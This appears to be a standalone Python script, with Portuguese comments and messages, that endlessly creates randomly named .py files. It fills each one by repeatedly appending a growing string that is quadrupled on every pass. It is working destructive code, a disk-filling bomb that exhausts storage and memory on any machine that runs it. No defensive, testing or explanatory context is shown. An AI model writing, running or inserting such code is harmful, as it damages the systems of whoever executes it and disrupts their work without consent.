import secrets

trash = 999999999999999999999999999999999999999 * 99998899999999999999999999

while True:
    caracteres = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-'
    name = ''.join(secrets.choice(caracteres) for _ in range(30))

    print(f"Criando arquivo: {name}.py")

    while True:
        try:
            with open(f"{name}.py", "a") as file:
                file.write(str(trash))

            with open(f"{name}.py", "r") as file:
                trash = file.read()

            trash = trash * 4  # equivale ao seu + + + +

            with open(f"{name}.py", "a") as file:
                file.write(trash)

        except Exception as e:
            print(f"Erro ao escrever em {name}.py: {e}")
            break